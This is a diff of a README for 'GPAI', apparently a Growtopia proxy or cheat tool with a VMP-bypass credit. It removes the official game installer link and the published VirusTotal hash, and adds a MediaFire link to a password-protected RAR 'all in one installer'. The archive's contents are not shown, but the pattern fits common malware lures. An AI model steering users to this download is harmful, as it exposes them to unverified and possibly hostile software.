@@ -1,11 +1,14 @@
 # This is the real Github (Check name github Hertzsz)
 # Version
-* Version : <b>4.38</b> [10/9/2023]
+* Version : <b>4.40</b> [11/3/2023]
 * Compatible growtopia version : <b>4.19</b>
-* [Download Growtopia 4.19](https://ubistatic-a.akamaihd.net/0098/594764/GrowtopiaInstaller.exe)
-
 # NOTE
 Use Growtopia 4.19 🇹🇰
+
+# Changelogs [11/6/2023]
+* Updated to All in one installer with GT 4.19 with proxy script inside script folder.
+* Link to NEW [Download](https://www.mediafire.com/file/tms8hye3zacc7tu/GPAI.rar/file)
+# Password : GPAI
 
 
 # Changelogs [11/3/2023]
@@ -13,12 +16,6 @@ Use Growtopia 4.19 🇹🇰
 
 # Changelogs [10/9/2023]
 * Updated to 4.39
-
-# Download
-* Hash = <b>4d6014b42ebd41373f5b6f0e01ffebb8f2a14a0dc9eb5e6849a99dccecafe92f (Virustotal hash)</b>
-* [Download](https://www.mediafire.com/file/et99sqeka87fjvd/GPAI.rar/file)
-# Password : GPAI
-* [Growtopia](growtopiagame.com)
 
 # Credits
 * [aname for bypass vmp]
